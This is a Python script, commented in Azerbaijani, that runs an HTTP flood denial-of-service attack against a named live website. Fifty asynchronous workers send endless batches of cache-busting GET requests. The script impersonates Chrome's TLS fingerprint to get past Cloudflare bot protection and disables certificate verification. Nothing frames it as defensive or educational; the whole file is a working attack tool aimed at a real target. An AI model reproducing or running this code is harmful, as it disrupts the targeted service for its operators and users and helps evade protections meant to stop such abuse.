import asyncio
from curl_cffi.requests import AsyncSession
import random
import time

TARGET_URL = "https://streamwin.win"
WORKERS = 50 # Sürətli yox, ağıllı və "keçici" hücum
BATCH = 20

async def ghost_strike(worker_id):
    # impersonate="chrome" - Bu sehrli söz Cloudflare-i aldadır
    async with AsyncSession(impersonate="chrome", http2=True, verify=False) as s:
        print(f"👻 Ghost Worker {worker_id} - CLOUDFLARE OYUNA GƏLDİ!")
        
        while True:
            try:
                # Saytın daxili yollarını hədəf alırıq
                url = f"{TARGET_URL}/?v={random.random()}&s={random.randint(1,99999)}"
                
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                }

                tasks = []
                for _ in range(BATCH):
                    # Cloudflare bypass edildikdən sonra ağır POST sorğuları atılır
                    tasks.append(s.get(url, headers=headers, timeout=10))
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Uğurlu sorğuları izlə
                success = len([r for r in responses if hasattr(r, 'status_code') and r.status_code == 200])
                if success > 0:
                    print(f"🔥 Worker {worker_id}: {success} paket darvazadan keçdi!", end="\r")

            except Exception:
                await asyncio.sleep(0.1)

async def main():
    print(f"💀 GHOST MODE ACTIVATED ON: {TARGET_URL}")
    print("[!] Bypassing Cloudflare JA3 Fingerprinting...")
    
    workers = [ghost_strike(i) for i in range(WORKERS)]
    await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
